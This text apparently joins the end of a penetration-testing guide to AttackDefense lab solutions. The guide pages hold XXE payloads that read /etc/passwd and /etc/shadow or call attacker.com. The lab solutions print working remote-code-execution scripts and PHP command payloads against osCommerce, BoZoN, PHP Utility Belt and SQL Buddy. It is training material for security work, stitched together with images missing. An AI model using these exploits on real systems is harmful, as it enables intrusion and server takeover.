This test could crash the web server (on a UNIX  system), if the XML parser attempts to substitute 
the 
entity with the contents of the /dev/random file. 
Other useful tests are the following: 
<?xml version="1.0" encoding="ISO-8859-1"?> 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
138 
 
 <!DOCTYPE foo [   
   <!ELEMENT foo ANY > 
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> 
 
 <?xml version="1.0" encoding="ISO-8859-1"?> 
 <!DOCTYPE foo [   
   <!ELEMENT foo ANY > 
   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo> 
 
 <?xml version="1.0" encoding="ISO-8859-1"?> 
 <!DOCTYPE foo [   
   <!ELEMENT foo ANY > 
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> 
 
 <?xml version="1.0" encoding="ISO-8859-1"?> 
 <!DOCTYPE foo [   
   <!ELEMENT foo ANY > 
   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo> 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
139 
 
8. Testing for XPath Injection 
XPath is a language that has been designed and developed primarily to address parts of an XML 
document. XML databases that organize data using the XML language. XPath is very similar to SQL in 
its purpose and applications, an interesting result is that XPath injection attacks follow the same logic as 
SQL injection attacks. 
How to Test 
 
Refer: SQL injection Authentication Bypass 
Test Example 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
140 
 
9. Testing for Code Injection 
In code injection testing, a tester submits input that is processed by the web server as dynamic code or as 
an included file. These tests can target various server-side scripting engines, e.g ASP or PHP. Proper 
input validation and secure coding practices need to be employed to protect against these attacks. 
How to Test 
 
Using the query string, the tester can inject code to be processed as part of the included file 
 
Determine user input in execution function, try to enter commands into the Data input field 
Test Example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
141 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
142 
 
10. Testing for Command Injection 
OS command injection is a technique used via a web interface in order to execute OS commands on a 
web server. The user supplies operating system commands through a web interface in order to execute OS 
commands. Any web interface that is not properly sanitized is subject to exploit. 
How to Test 
 
List all input of web interface 
 
Using special character below 
 
Test Example 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
143 
 
 
 
 
Testing for Error Handling 
1. Analysis of Error Codes 
These codes are very useful to penetration testers during their activities because they reveal a lot of 
information about databases, bugs, and other technological components directly linked with web 
applications. 
How to Test 
 
Test 404 Not Found:  
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
144 
 
 
 
Test 400 Bad Request: 
 
 
Test 405 Method not Allowed 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
145 
 
 
 
Test 408 Request Time out 
 
 
Test 501 Method Not Implemented 
 
 
Test enumeration of the directories with access denied 
o http://<host>/<dir> 
o Result: dir listing, not allow to be listed, forbidden or don’t have permission to access. 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
146 
 
 
2. Analysis of Stack Traces 
Stack traces are not vulnerabilities by themselves, but they often reveal information that is interesting to 
an attacker. This information could then be used in further attacks. 
How to Test 
Some tests to try include: 
 
Invalid input (such as input that is not consistent with application logic) 
 
Input that contains non alphanumeric characters or query syntax 
 
Empty inputs 
 
Input that are too long 
 
Access to internal pages without authentication 
 
Bypassing application flow 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
147 
 
 
Testing for weak Cryptography 
1. SSL/TLS Testing 
Testing SSL/TLS cipher specifications and requirements for site: 
Black box testing: Detect possible of weak cipher, the ports associate to SSL/TLS must be defined. 
Typically include port 443 which standard https port. 
 
Nmap scanner via “-sV” scan option, is able to identify SSL services. 
 
 
Identifying SSL services and weak ciphers with Nessus. 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
148 
 
 
 
Identifying weak cipher with https://www.ssllabs.com/projects/index.html 
 
 
Manually audit weak SSL cipher levels with openSSL 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
149 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
150 
 
 
White box testing: Check the configuration of the web servers which provide https services. If the web 
application provides other SSL/TLS wrapped services, these should be checked as well. 
Example: 
 
The registry path in windows defines the ciphers available to the server: 
o HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SC
HANNEL\Ciphers\ 
 
Linux? 
Testing SSL Certificate Validity – Client and Server 
When accessing a web application via https protocol, a secure channel is established between client and 
server. The identify is digital certificates. In order for the communication to be setup, a number of checks 
on the certificates must be passed: 
 
Check the CA (Certificate Authority) is trusted 
o Each browser come with a preloaded list of trusted CAs, against which the certificate 
singing CA is compared. 
 
Check the certificate is currently valid 
o Certificate have an associated period of validity. Browser can warned this case. 
 
Check that name of site and name reported in the certificate match 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
151 
 
o If the name of the server and the certificate do not match, it might sound suspicious. A 
system may host a number of name-based virtual hosts, which share same IP address and 
are identified by means of the HTTP 1.1 host: header. In this case, since the SSL 
handshake checks the server certificate before HTTP request is processed, it is not 
possible to assign different certificates to each virtual server. 
Black box testing: 
 
Using Browser such as FireFox 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
152 
 
 
 
 
 
More 
at: 
https://support.mozilla.org/en-US/kb/what-does-your-connection-is-not-secure-
mean#w_the-certificate-will-not-be-valid-until-date  
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
153 
 
 
Using MMC in window to view list of trusted CA 
 
2. Testing for Padding Oracle 
A padding oracle is a function of an application which decrypts encrypted data provided by the client, e.g 
internal session state stored on the client, and leaks the state of the validity of the padding after 
decryption. The existence of a padding oracle allows an attacker to decrypt encrypted data and encrypt 
arbitrary data without knowledge of the key used for these cryptographic operations.  
Block ciphers encrypt data only in blocks of certain sizes. Block sizes used by common ciphers are 8 and 
16 bytes. Data where the size doesn’t match a multiple of the block size of the used cipher has to be 
padded in a specific manner so the decryptor is able to strip the padding. A commonly used padding 
scheme is PKCS 7. It fills the remaining bytes with the value of the padding length. 
Example 
If the padding has the length of 5 bytes, the byte value 0x05 is repeated five times after the plain text. 
Certain modes of operation of cryptography allow bit-flipping attacks, where flipping of a bit in the 
cipher text causes that the bit is also flipped in the plain text. Flipping a bit in the n-th block of CBC 
encrypted data causes that the same bit in the (n+1)-th block is flipped in the decrypted data. The n-th 
block of the decrypted cipher text is garbaged by this manipulation. 
How to Test 
Use below tools to testing this case 
 
PadBuster - https://github.com/GDSSecurity/PadBuster   
 
python-paddingoracle - https://github.com/mwielgoszewski/python-paddingoracle 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
154 
 
 
 Poracle  - https://github.com/iagox86/Poracle Padding    
 
Oracle Exploitation Tool (POET) - http://netifera.com/research/   
Test Example 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
155 
 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
156 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
157 
 
 
 
 
 
Business Testing Logic 
1. Test Business Logic Data Validation 
The application must ensure that only logically valid data can be entered at the front end as well as 
directly to the server side on an application of system. The front end and the back end of the application 
should be verifying and validating that the data it has, it using and is passing along is logically valid. 
How to Test 
 
Review the project documentation and use exploratory testing looking for data entry points or 
hand off points between system or software. 
 
Once found try to insert logically invalid data into the application/system 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
158 
 
 
Perform front-end GUI functional valid testing on the application to ensure that the only “valid” 
values are accepted 
 
Using an intercept proxy observe the HTTP-POST/GET looking for places that variables such as 
cost an quality are passed. 
 
Verify that input HTTP  request and every HTTP response contains a content type header 
specifying a safe character set (e.g., UTF-8). 
 
Verify that HTTP headers in both requests and responses contain only printable ASCII characters 
 
Verify that the input field have “max-length” 
Test example 
 
 
 
Refer 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
159 
 
 
All Input Validation test cases  
 
Testing for Account Enumeration and 
Guessable User  Account  
 
Testing for Bypassing Session Management Schema 
 
Testing for Exposed Session Variables  
2. Test Ability to Forge Requests 
How to Test 
 
Using an intercepting proxy observe the HTTP POST/GET looking for some indication that 
values are incrementing at a regular interval or are easily guessable. 
 
If it is found that some value is guessable this value may be changed and one may gain 
unexpected visibility 
 
Using an intercepting proxy observe the HTTP POST/GET looking for some indication of hidden 
features such as debug that can be switched on or activated 
 
If any are found try to guess and changes these values to get a different application response or 
behavior 
Refer 
 
Testing for Exposed Session Variables 
 
Testing for CSRF 
 
Testing for Account Enumeration and Guessable User Account 
3. Test Integrity Checks 
How to Test 
 
Using a proxy capture and HTTP traffic looking for hidden fields /  non editable 
 
If a hidden field is found see how these fields compare with the GUI application and start 
interrogating this value through the proxy by submitting different data values trying to 
circumvent the business and manipulate values you were not intended to have access to. 
 
List components of the application or system that could be edited, for example logs or databases 
 
For each component identified, try to read, edit or remove its information 
Test Example 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
160 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
161 
 
 
 
Refer 
 
All Input Validation test cases 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
162 
 
4. Test for Process Timing 
How to Test 
 
Review  the project documentation and  use exploratory  testing looking  for application/system 
functionality that may be impacted by  time. Such as execution  time or  actions that help users 
predict a future outcome or allow one 
to circumvent any part of 
the 
business 
logic 
or 
workflow 
 
Develop and execute the misuse cases  ensuring that attackers  can not  gain an  advantage 
based on any timing 
Refer 
 
Testing for Cookies attributes 
 
Test Session Timeout 
5. Test Defense Against Application Misuse 
The misuse and invalid use of valid functionality can identify attacks attempting to enumerate the web 
application, identify weaknesses, and exploit vulnerabilities. 
How to test 
 
All other test cases are relevant 
6. Test Upload of Unexpected File Types 
Many application’s business processes allow for the upload and manipulation of data that is submitted via 
files. 
How to Test 
 
Review  the project documentation and  perform some exploratory testing looking for file  types 
that should be "unsupported" by  the application/system. 
 
Try to upload these “unsupported” files  an verify that it  are properly rejected. 
 
If multiple files  can be uploaded  at once, there must be  tests in place to verify that each  file is 
properly evaluated. 
 
Study the applications logical requirements. 
 
Prepare a library of files that are “not 
approved” for upload 
that may contain files such as: 
jsp, exe, or html files containing script. 
 
In the application navigate to the file submission or upload mechanism. 
 
Submit the “not approved” file  for upload and  verify that they are properly prevented  from 
uploading. 
Test Example 
 
Basic file upload 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
163 
 
 
 
 
 
 
Double Extension Injection Technique 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
164 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
165 
 
 
 
 
 
 
 
Content Type file Upload 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
166 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
167 
 
 
 
 
 
Null byte Injection 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
168 
 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
169 
 
 
 
 
Blacklisting File Extensions 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
170 
 
7. Test Upload of Malicious Files 
How to Test 
 
Review the project documentation and use exploratory testing looking at the application/system 
to identify what constitutes and “malicious” file in you environment 
 
Develop or acquire a know “malicious” file 
 
Using the Metasploit payload generation functionality generates a shellcode as a windows 
executable using the Metasploit “msfvenom” command 
 
Try to upload the malicious file to the application/system and verify that it is correctly rejected 
 
Set up the intercepting proxy to capture the “valid” request for an accepted file 
 
Send an “invalid” request through with a valid/acceptable file extension and see if the request is 
accepted or rejected 
Related Test Cases 
 
Test File Extensions Handling for Sensitive Information 
 
Test Upload of Unexpected File Types 
Tools 
 
Metasploit’s payload generation functionality 
 
Intercept proxy 
Test example 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
171 
 
 
 
 
Upload and active malicious file, hacker will gain & remote victim’s computer 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
172 
 
 
 
Client Side Testing 
1. Testing for Client Side URL Redirect 
This vulnerability occurs when an application accepts untrusted input that contains an URL value without 
sanitizing it. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a 
phishing scam and steal user credentials. 
How to Test 
 
Spider target site 
 
Filter sitemap by status code such as 3xx [Redirection] 
 
Analysis results , modify and scan 
Test Example 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
173 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
174 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
175 
 
 
 
2. Testing for Clickjacking 
Clickjacking is a malicious technique that consist of deceiving a web user into interacting (in most case 
by clicking) with something different to what the user believes they are interacting with 
How to Test 
 
Intercept proxy and analyze header (X-Frame-Option) 
 
Automate Scanner 
Tools 
 
BurpSuite 
 
"Clickjacking Tool" - http://www.contextis.com/research/tools/clickjacking-tool/  
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
176 
 
Test Example 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
177 
 
3. Test Cross Origin Resource Sharing 
Cross Origin Resource Sharing or CORS is a mechanism that enables a web browser to perform “cross-
domain” requests using the XMLHttpRequest L2 API in a controlled manner 
How to Test 
 
Origin & Access-Control-Allow-Origin: insecure configuration as ‘*’ wildcard as value of the 
Access-Control-Allow-Origin (all domains are allowed) 
 
Access-Control-Request-Method & Access-Control-Allow-Method (must have in response 
header by the server to describe the methods the clients are allowed to use) 
 
Access-Control-Request-Header & Access-Control-Allow-Headers: determine which header can 
be used to perform a cross-origin request 
 
Access-Control-Allow-Credential: this header as part of preflight request indicates that the final 
request can include user credential 
 
Input validation 
Test Example 
 
Using automate scan tool & intercept proxy tools 
 
4. Testing for Spoofable Client IP address 
If an application trusts an HTTP request header like X-Forwarded-For to accurately specify the remote IP 
address of the connecting client, then malicious clients can spoof their IP address. This behavior does not 
necessarily constitute a security vulnerability, however some applications use client IP addresses to 
enforce access controls and rate limits. For example, an application might expose administrative 
functionality only to clients connecting from the local IP address of the server, or allow a certain number 
of failed login attempts from each unique IP address. Consider reviewing relevant functionality to 
determine whether this might be the case 
How to Test 
 
Intercept proxy 
 
Make sure request header do not import X-Forwarded-For, True-Client-IP, and X-Real-IP 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
178 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
[WEB APPLICATION PENETRATION TESTING] March 1, 2018 
 
179 
 
About Authors: 
I am Manh Pham Tien, a very young researcher passionate in penetration testing, web security / exploit, 
cryptography & network security. 
 
 
 
 
 
 
 
 
 
 
 
 
 
Name 
Joomla com_xcloner Component 
URL 
https://www.attackdefense.com/challengedetails?cid=8  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “joomla com_ xcloner component remote code execution” and look 
for publically available exploits.  
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/16246 
 
 
 
Step 3: ​Save the python script provided at the Exploit DB link as exploit.py 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​python exploit.py 
 
 
 
 
 
 
 
 
 
 
 
 
The exploitation script requires the hostname and the path of the web application to be passed 
as arguments.  
 
Step 5: ​Exploit the vulnerable web application. 
 
Run the exploitation script with required arguments.  
 
Commands:  
python exploit.py -t eh6xocqiumhn7pjpyoj8vxiyy.public2.attackdefenselabs.com -d /joomla/ 
id 
whoami 
 
 
 
 
 
 
References:  
 
1.
XCloner-Backup and Restore 
(​https://extensions.joomla.org/extension/xcloner-backup-and-restore/​)  
2.
Joomla! Component com_xcloner-backupandrestore - Remote Command Execution  
(​https://www.exploit-db.com/exploits/16246​)  
 
 
 
 
 
Name 
osCommerce 
URL 
https://www.attackdefense.com/challengedetails?cid=19  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “oscommerce remote code execution” and look for publically 
available exploits.  
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44374  
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Modify python script provided at the Exploit DB link and save it as exploit.py 
 
Modify the base_url, target_url and the command to be executed in the python script provided at 
Exploit DB link.  
 
Modified Lines:  
 
base_url = "http://p7snlfplrerztfajij6cfqyaw.public1.attackdefenselabs.com/" 
target_url = "http://p7snlfplrerztfajij6cfqyaw.public1.attackdefenselabs.com/install/install.php?step=4" 
payload += 'system("id");'
# this is where you enter you PHP payload 
 
 
 
 
 
Updated Python script: 
 
import requests 
 
# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4) 
base_url = "http://p7snlfplrerztfajij6cfqyaw.public1.attackdefenselabs.com/" 
target_url = "http://p7snlfplrerztfajij6cfqyaw.public1.attackdefenselabs.com/install/install.php?step=4" 
 
data = { 
'DIR_FS_DOCUMENT_ROOT': './' 
} 
 
# the payload will be injected into the configuration file via this code 
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" . 
# so the format for the exploit will be: '); PAYLOAD; /* 
 
payload = '\');' 
payload += 'system("id");'
# this is where you enter you PHP payload 
payload += '/*' 
 
data['DB_DATABASE'] = payload 
 
# exploit it 
r = requests.post(url=target_url, data=data) 
 
if r.status_code == 200: 
print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + 
base_url + "install/includes/configure.php") 
else: 
print("[-] Exploit did not execute as planned") 
 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Run the exploitation script. 
 
 
 
The exploitation was successful.  
 
Step 5: ​Navigate to the URL generated in the previous step to execute “id” command on the 
compromised web application. 
 
URL​: 
http://p7snlfplrerztfajij6cfqyaw.public1.attackdefenselabs.com/install/includes/configure.php 
 
 
 
References:  
 
1.
osCommerce (​https://github.com/osCommerce/oscommerce​)  
2.
osCommerce 2.3.4.1 - Remote Code Execution 
(​https://www.exploit-db.com/exploits/44374​) 
 
 
 
 
 
 
 
Name 
ApPHP MicroBlog 
URL 
https://www.attackdefense.com/challengedetails?cid=24  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “apphp microblog remote code execution” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/33070 
 
 
 
 
Step 3: ​Save the python script provided at the Exploit DB link as exploit.py 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​python exploit.py 
 
 
 
The exploitation script requires the URL of the vulnerable web application to be passed as 
argument.  
 
Step 5: ​Exploit the vulnerable web application and execute commands through the webshell. 
 
Run the exploitation script with required arguments.  
 
Commands:  
python exploit.py http://7ypi9wka4e1owsy6g7q3nc2sv.public2.attackdefenselabs.com/  
id  
whoami 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
References:  
 
1.
ApPHP MicroBlog (​https://www.apphp.com/php-microblog/​)  
2.
ApPHP MicroBlog 1.0.1 - Remote Command Execution 
(​https://www.exploit-db.com/exploits/33070​) 
 
 
 
 
 
 
 
Name 
PHP Utility Belt 
URL 
https://www.attackdefense.com/challengedetails?cid=250  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “php utility belt remote code execution” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerable web application. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/38901  
 
 
 
Step 3: ​Modify the payload provided at Exploit DB Link and inject it into the text field. 
 
Original Payload: ​fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>'); 
 
Modified Payload: ​fwrite(fopen('info.php','w'),'<?php echo exec("id")?>'); 
 
 
 
 
 
 
 
 
Click on the Run button: 
 
 
 
 
 
Step 4: ​Navigate to the “/info.php” webpage to execute the injected command.  
 
Run the exploitation script with required arguments.  
 
URL: ​http://nsuskwboqro1eg5c0zrt517ja.public2.attackdefenselabs.com/info.php 
 
 
 
References:  
 
1.
PHP Utility Belt (​https://github.com/mboynes/php-utility-belt​)  
2.
PHP Utility Belt - Remote Command Execution 
(​https://www.exploit-db.com/exploits/38901​) 
 
 
 
 
 
 
 
Name 
 BoZoN 
URL 
https://www.attackdefense.com/challengedetails?cid=251  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “bozon remote code execution” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41084 
 
 
 
 
 
Step 3: ​Modify the python script provided at the Exploit DB link and save it as exploit.py 
 
The modified python scripts takes the hostname and the command to be executed as 
arguments.  
 
Modified Python Script:  
 
import urllib,urllib2,time 
import sys 
 
IP=sys.argv[1] 
CMD='"];$PWN=''exec(\"'+sys.argv[2]+'>output\");//''//"' 
 
url = 'http://'+IP+'/index.php' 
data = urllib.urlencode({'creation' : '2', 'login' : CMD, 'pass' : 'abc123', 'confirm' : 'abc123', 'token' : ''}) 
req = urllib2.Request(url, data) 
 
print "Sending Requests" 
for i in range(0,3): 
  response = urllib2.urlopen(req) 
  time.sleep(1) 
print "Done!... waiting for output\n" 
response = urllib2.urlopen('http://'+IP+'/output') 
time.sleep(0.5) 
print response.read() 
 
Command: ​cat exploit.py 
 
 
 
 
Step 4: ​Exploit the vulnerable web application. 
 
Run the exploitation script with required arguments.  
 
Commands:  
python exploit.py rsofe6waw5i8r04hxn2lr70wu.public1.attackdefenselabs.com 'id' 
python exploit.py rsofe6waw5i8r04hxn2lr70wu.public1.attackdefenselabs.com 'whoami' 
 
 
 
 
 
 
 
References:  
 
1.
BoZon (​https://github.com/broncowdd/BoZoN​)  
2.
BoZoN 2.4 - Remote Code Execution 
(​https://www.exploit-db.com/exploits/41084​)  
 
 
 
 
 
Name 
RPi Cam Control 
URL 
https://www.attackdefense.com/challengedetails?cid=252  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “rpi cam control remote code execution” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the python script required to exploit the vulnerable web application 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/45361  
 
 
 
 
 
 
 
 
 
 
Step 3: ​Save the python script provided at the Exploit DB link as exploit.py 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​python exploit.py 
 
 
 
 
 
 
 
 
The exploitation script requires the URL of the vulnerable web page to be passed as arguments.  
 
 
Step 5: ​Exploit the vulnerable web application. 
 
Run the exploitation script with required arguments.  
 
Commands:  
python exploit.py http://azltf01i8muldgqd75m2uis8t.public2.attackdefenselabs.com/preview.php  
id  
whoami 
 
 
 
 
References:  
 
1.
RPi Cam Control (​https://elinux.org/RPi-Cam-Web-Interface​)  
2.
RPi Cam Control < 6.4.25 - 'preview.php' Remote Command Execution 
(​https://www.exploit-db.com/exploits/45361​) 
 
 
 
 
Name 
SQL Buddy 
URL 
https://www.attackdefense.com/challengedetails?cid=428  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “sql buddy remote code execution” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/35428 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Login to the web application 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: root 
●
Password: <BLANK or NO PASSWORD> 
 
Dashboard:  
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Select “app” database on the left panel and create a table  
 
Create table “shell” with one column named “shell” of type “text”. 
 
Enter “shell” in the “Name” text field in the “CREATE A NEW TABLE” section.  
 
Enter “shell” in the “Name” text file and select type of the column as “text” in the last section. 
 
 
 
 
 
 
 
 
 
Click on Submit button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Inject the php payload in the “shell” table. 
 
Click on “Insert” tab and inject the php payload given below in the text field. 
 
PHP Payload: ​ <?php echo `id`?> 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on Submit button. 
 
 
 
Step 6: ​Export the shell table to “shell.php” file on the web server.  
 
Select “CSV” option in “Format” section. 
Select “Comma” option in “Delimiter” section 
Select “Text file” option in “Output to” section and specify “shell.php” in the text field. 
 
 
 
 
Click on the Submit button  
 
 
 
 
 
 
The shell table was exported successfully.  
 
Step 7: ​View the output of the executed command by navigating to the hyperlink generated 
after exporting the table. 
 
URL: ​http://vv96ugvif661bbgt8btu1odz6.public2.attackdefenselabs.com/exports/shell.php 
 
 
 
References:  
 
1.
SQL Buddy (​http://sqlbuddy.com/​) 
 
2.
SQL Buddy 1.3.3 - Remote Code Execution 
 (​https://www.exploit-db.com/exploits/35428​)  
 
 
 
Name 
Clipper CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=429  
Type 
Real World Webapps : Remote Code Execution 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
